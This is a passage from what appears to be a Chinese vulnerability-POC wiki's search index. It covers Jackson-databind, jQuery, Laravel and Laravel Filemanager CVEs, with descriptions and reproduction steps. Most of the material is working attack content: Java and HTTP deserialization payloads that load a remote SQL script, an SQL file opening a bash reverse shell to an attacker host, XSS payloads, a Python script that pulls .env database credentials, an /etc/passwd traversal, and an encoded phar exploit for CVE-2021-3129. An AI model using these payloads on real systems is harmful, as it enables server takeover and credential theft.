: \"\"; } $$; CALL SHELLEXEC('calc.exe') poc.java： import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.SerializationFeature; public class POC { public static void main(String[] args) throws Exception { String payload = \"[\\\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\\\",{\\\"url\\\":\\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:3333/exec.sql'\\\"}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); } } Gadget： DriverAdapterCPDS -\u003eseturl -\u003egetPooledConnection -\u003eDirverManager.getConnection(this.url,username,pass) ","date":"0001-01-01","objectID":"/jackson-databind-ssrfrce-cve-2020-36179~36182/:3:0","tags":null,"title":"","uri":"/jackson-databind-ssrfrce-cve-2020-36179~36182/"},{"categories":null,"content":"Jackson-databind 远程代码执行 CVE-2019-12384 ","date":"0001-01-01","objectID":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/:0:0","tags":null,"title":"","uri":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/"},{"categories":null,"content":"漏洞描述 多个Redhat产品受此漏洞影响，CVSS评分为8.1，漏洞利用复杂度高。 该漏洞是由于Jackson黑名单过滤不完整而导致，当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法时，程序就会受到此漏洞的影响，攻击者就可利用构造的包含有恶意代码的json数据包对应用进行攻击，直接获取服务器控制权限。 ","date":"0001-01-01","objectID":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/:1:0","tags":null,"title":"","uri":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/"},{"categories":null,"content":"漏洞影响 受影响版本： Jackson-databind 2.X \u003c 2.9.9.1 不受影响版本： Jackson-databind 2.9.9.1 Jackson-databind 2.10 ","date":"0001-01-01","objectID":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/:2:0","tags":null,"title":"","uri":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/:3:0","tags":null,"title":"","uri":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/"},{"categories":null,"content":"SSRF POST /fuckme HTTP/1.1 Host: 192.168.136.131:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 109 poc=[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://192.168.136.129:7777/\"}] 或者直接使用dnslog验证： poc=[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://jcqfpe.dnslog.cn/\"}] ","date":"0001-01-01","objectID":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/:3:1","tags":null,"title":"","uri":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/"},{"categories":null,"content":"RCE 首先在vps上放置一个.sql的文件，内容如下： CREATE ALIAS SHELLEXEC AS $ String shellexec(String cmd) throws java.io.IOException { String[] command = {\"bash\", \"-c\", cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; } $; CALL SHELLEXEC('bash -i \u003e\u0026 /dev/tcp/192.168.136.129/7777 0\u003e\u00261') 然后发送payload，请求远程的sql文件，进行RCE POST /fuckme HTTP/1.1 Host: 192.168.136.131:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 164 poc=[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.136.129/exp.sql'\"}] ","date":"0001-01-01","objectID":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/:3:2","tags":null,"title":"","uri":"/jackson-databind%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2019-12384/"},{"categories":null,"content":"jQuery XSS漏洞 CVE-2020-11022 11023 ","date":"0001-01-01","objectID":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/:0:0","tags":null,"title":"","uri":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/"},{"categories":null,"content":"漏洞描述 据NVD描述：在大于或等于1.2且在3.5.0之前的jQuery版本中，即使执行了消毒（sanitize）处理，也仍会执行将来自不受信任来源的HTML传递给jQuery的DOM操作方法（即html()、.append()等），从而导致xss漏洞。 ","date":"0001-01-01","objectID":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/:1:0","tags":null,"title":"","uri":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/"},{"categories":null,"content":"漏洞影响 3.5.0 \u003e jQuery \u003e= 1.2 ","date":"0001-01-01","objectID":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/:2:0","tags":null,"title":"","uri":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/"},{"categories":null,"content":"漏洞复现 在线复现地址， 可以通过观察变化了解漏洞 https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html PoC 1. \u003cstyle\u003e\u003cstyle /\u003e\u003cimg src=x onerror=alert(1)\u003e PoC 2. (Only jQuery 3.x affected) \u003cimg alt=\"\u003cx\" title=\"/\u003e\u003cimg src=x onerror=alert(1)\u003e\"\u003e PoC 3. \u003coption\u003e\u003cstyle\u003e\u003c/option\u003e\u003c/select\u003e\u003cimg src=x onerror=alert(1)\u003e\u003c/style\u003e PoC 1和PoC 2具有相同的根本原因。在中.html()，作为参数传递的HTML字符串将传递到 $ .htmlPrefilter（） 方法。该htmlPrefilter处理用于替换自闭合标签等进行到，通过使用以下正则表达式：\u003ctagname **/\u003e**``\u003ctagname \u003e\u003c/tagname\u003e rxhtmlTag = / \u003c（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[ww：-] +）[^\u003e] *）\\ /\u003e / gi [。 ..] htmlPrefilter：function（html）{ return html.replace（rxhtmlTag，“ \u003c$ 1\u003e \u003c/ $ 2\u003e”）; } 如果PoC 1的HTML通过此替换，则输出将是： \u003e $ .htmlPrefilter（'\u003cstyle\u003e \u003cstyle /\u003e \u003cimg src = x onerror = alert（1）\u003e'） \u003c“ \u003cstyle\u003e \u003cstyle\u003e \u003c/ style\u003e \u003cimg src = x onerror = alert（1） \u003e“ 黄色部分是替换的字符串。由于此替换，\u003cstyle /\u003e样式元素内部被替换\u003cstyle \u003e\u003c/style\u003e为，结果是，之后的字符串从样式元素中被踢出。之后，.html()将替换的HTML分配给innerHTML。在这里，\u003cimg ...\u003e字符串变成了实际的img标签，并触发了onerror事件。 顺便说一下，上述正则表达式在3.x之前的jQuery中使用。从3.x开始，使用了另一个经过稍加修改的正则表达式 rxhtmlTag = / \u003c（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[az] [^ \\ / \\ 0\u003e \\ x20 \\ t \\ r \\ n \\ f] *）[^\u003e] *）\\ /\u003e / gi 此更改引入了另一个XSS向量，该向量可能仅由更多基本元素和属性导致XSS。通过此更改引入了PoC 2的向量。它仅适用于jQuery3.x。 \u003e $ .htmlPrefilter（'\u003cimg alt =“ \u003cx” title =“ /\u003e \u003cimg src = x onerror = alert（1）\u003e”\u003e'） \u003c“ \u003cimg alt =” \u003cx“ title =”\u003e \u003c / x“\u003e \u003cimg src = x onerror = alert（1）\u003e”\u003e“ 在这种情况下，属性值上的 img 字符串被踢出并发生XSS。 ","date":"0001-01-01","objectID":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/:3:0","tags":null,"title":"","uri":"/jquery-xss%E6%BC%8F%E6%B4%9E-cve-2020-11022-11023/"},{"categories":null,"content":"Laravel .env 配置文件泄露 CVE-2017-16894 ","date":"0001-01-01","objectID":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/:0:0","tags":null,"title":"","uri":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/"},{"categories":null,"content":"漏洞描述 Laravel Framework是Taylor Otwell软件开发者开发的一款基于PHP的Web应用程序开发框架。 Laravel framework 5.5.21及之前的版本中存在 .env 文件可被下载的信息泄露漏洞。远程攻击者可利用该漏洞获取敏感信息 ","date":"0001-01-01","objectID":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/:1:0","tags":null,"title":"","uri":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/"},{"categories":null,"content":"漏洞影响 Laravel framework \u003c= 5.5.21 ","date":"0001-01-01","objectID":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/:2:0","tags":null,"title":"","uri":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/"},{"categories":null,"content":"网络测绘 app=\"Laravel-Framework\" ","date":"0001-01-01","objectID":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/:3:0","tags":null,"title":"","uri":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/"},{"categories":null,"content":"漏洞复现 访问目标 url http://xxx.xxx.xxx.xxx/.env 当配置不当且在影响范围内时会出现 .env可被下载的情况，导致数据库账号密码等敏感信息的泄露 这里使用POC脚本来进行信息获取 ","date":"0001-01-01","objectID":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/:4:0","tags":null,"title":"","uri":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/"},{"categories":null,"content":"漏洞POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Laravel framework \u003c= 5.5.21 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/.env\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"APP_NAME\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] .env 文件请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/:5:0","tags":null,"title":"","uri":"/laravel-.env-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-cve-2017-16894/"},{"categories":null,"content":"Laravel Filemanager插件 download 任意文件读取漏洞 CVE-2022-40734 ","date":"0001-01-01","objectID":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/:0:0","tags":null,"title":"","uri":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/"},{"categories":null,"content":"漏洞描述 Laravel Filemanager插件 download 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感数据 ","date":"0001-01-01","objectID":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/:1:0","tags":null,"title":"","uri":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/"},{"categories":null,"content":"漏洞影响 Laravel Filemanager插件 ","date":"0001-01-01","objectID":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/:2:0","tags":null,"title":"","uri":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/"},{"categories":null,"content":"网络测绘 \"Laravel Filemanager\" ","date":"0001-01-01","objectID":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/:3:0","tags":null,"title":"","uri":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/:4:0","tags":null,"title":"","uri":"/laravel-filemanager%E6%8F%92%E4%BB%B6-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-40734/"},{"categories":null,"content":"Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129 ","date":"0001-01-01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:0:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"漏洞描述 Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云应急响应中心监控到国外某安全研究团队披露了 Laravel \u003c= 8.4.2 存在远程代码执行漏洞。当Laravel开启了Debug模式时，由于Laravel自带的Ignition功能的某些接口存在过滤不严，攻击者可以发起恶意请求，通过构造恶意Log文件等方式触发Phar反序列化，从而造成远程代码执行，控制服务器。漏洞细节已在互联网公开。阿里云应急响应中心提醒 Laravel 用户尽快采取安全措施阻止漏洞攻击。 ","date":"0001-01-01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:1:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"漏洞影响 Laravel 框架 \u003c 8.4.3 facade ignition 组件 \u003c 2.5.2 ","date":"0001-01-01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:2:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"环境搭建 https://github.com/SNCKER/CVE-2021-3129.git docker-compose up -d 点击生成密钥出现如下图即成功创建漏洞环境 ","date":"0001-01-01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:3:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"漏洞复现 按照漏洞公开文章需要先有一个未知变量的错误，来点击 Make variable optional 按照官方手册创建路由和View模板 通过点击“Make variableOptional”按钮，模板变量则会被修改。如果检查HTTP日志，我们就会看到被调用的端点 通过这些solutions，开发者可以通过点击按钮的方式，快速修复一些错误。本次漏洞就是其中的vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php过滤不严谨导致的。首先我们到执行solution的控制器当中去，看看是如何调用到solution的 \u003c?php namespace Facade\\Ignition\\Http\\Controllers; use Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest; use Facade\\IgnitionContracts\\SolutionProviderRepository; use Illuminate\\Foundation\\Validation\\ValidatesRequests; class ExecuteSolutionController { use ValidatesRequests; public function __invoke( ExecuteSolutionRequest $request, SolutionProviderRepository $solutionProviderRepository ) { $solution = $request-\u003egetRunnableSolution(); $solution-\u003erun($request-\u003eget('parameters', [])); return response(''); } } 接着调用solution对象中的run()方法，并将可控的parameters参数传过去。通过这个点我们可以调用到MakeViewVariableOptionalSolution::run() \u003c?php namespace Facade\\Ignition\\Solutions; use Facade\\IgnitionContracts\\RunnableSolution; use Illuminate\\Support\\Facades\\Blade; class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this-\u003emakeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-\u003egenerateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE \u0026\u0026 $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } } 可以看到这里主要功能点是：读取一个给定的路径，并替换$variableName为$variableName ?? ''，之后写回文件中。由于这里调用了file_get_contents()，且其中的参数可控，所以这里可以通过phar://协议去触发phar反序列化。如果后期利用框架进行开发的人员，写出了一个文件上传的功能。那么我们就可以上传一个恶意phar文件，利用上述的file_get_contents()去触发phar反序列化，达到rce的效果。 除了解决方案的类名之外，还发送了一个文件路径和一个我们要替换的变量名。这看起来非常让人感兴趣。 让我们先检查一下类名的利用方法：我们可以实例化任意的类吗？ class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } 答案是否定的：Ignition总是用我们指向的类来实现RunnableSolution 那么，让我们仔细看看这个类。实际上，负责该操作的代码位**./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.php**文件中。那么，我们可以更改任意文件的内容么？ class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this-\u003emakeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-\u003egenerateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpec","date":"0001-01-01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:4:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"漏洞POC https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py # -*- coding: utf-8 -*- import requests,json import sys,re proxies = { \"http\": '127.0.0.1:8080'} header={ \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\", \"Content-Type\":\"application/json\" } def clearlog(url): data = { \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def AA(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"AA\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadwindows(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47","date":"0001-01-